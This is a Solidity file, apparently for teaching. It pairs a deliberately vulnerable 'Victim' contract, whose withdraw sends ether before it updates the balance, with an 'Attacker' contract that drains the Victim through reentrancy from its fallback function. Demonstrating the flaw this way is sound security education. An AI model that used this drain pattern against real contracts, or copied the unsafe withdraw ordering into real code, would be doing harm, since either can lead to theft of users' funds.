// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title A vulnerable contract allowing users to store and withdraw ether
/// @notice You can deposit ether by calling the `deposit` function and withdraw ether by calling the `withdraw` function
/// @dev This contract can be reentered by calling the `withdraw` function multiple times
contract Victim {

  error Reentrancy__NotEnoughBalance();
  error Reentrancy__WithdrawFailed();

  mapping(address => uint) public balances;

  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint _amount) public {
    if (balances[msg.sender] < _amount) {
      revert Reentrancy__NotEnoughBalance();
    }
    (bool sent, ) = msg.sender.call{value: _amount}("");
    if (!sent) {
      revert Reentrancy__WithdrawFailed();
    }
    // here lies the vulnerability, as the function does not follow the CEI pattern
    // indeed, user balance should be updated before performing the ether transfer
    unchecked { balances[msg.sender] -= _amount; }
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}

contract Attacker {
  Victim public victim = new Victim();

  constructor(address _victimAddress) {
    victim = Victim(_victimAddress);
  }

  function attack() public payable {
    victim.deposit{value: 1 ether}();
    victim.withdraw(1 ether);
  }

  fallback() external payable {
    if (victim.getBalance() > 0) {
      victim.withdraw(1 ether);
    }
  }

}
